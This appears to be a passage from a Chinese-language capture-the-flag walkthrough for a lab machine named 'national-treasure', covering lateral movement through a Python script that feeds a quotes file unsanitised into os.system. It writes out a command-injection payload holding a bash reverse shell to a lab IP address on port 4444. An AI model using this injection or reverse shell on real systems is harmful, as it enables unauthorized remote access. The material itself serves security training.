该脚本文件从 .quotes 文件中截取一段，然后通过 wall 命令进行广播

这其中使用了 os.system，而且没有对字符串进行任何处理

-rwxr--r-- 1 cage cage 255 May 26  2020 /opt/.dads_scripts/spread_the_quotes.py
weston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)

但是我们没有对 .quotes 文件修改的权限

weston@national-treasure:~$ ls -al /opt/.dads_scripts/.files/.quotes
-rwxrw---- 1 cage cage 4204 May 16 05:04 /opt/.dads_scripts/.files/.quotes

但是看了 wp，很奇怪，明明没有权限，为什么可以修改文件？

那就将反弹命令写入文件，并且覆盖里面之前所有的内容，这样能够保证一定会选到反弹命令

weston@national-treasure:~$ echo '$(bash -c "bash -i >& /dev/tcp/192.168.206.169/4444 0>&1")' > /opt/.dads_scripts/.files/.quotes
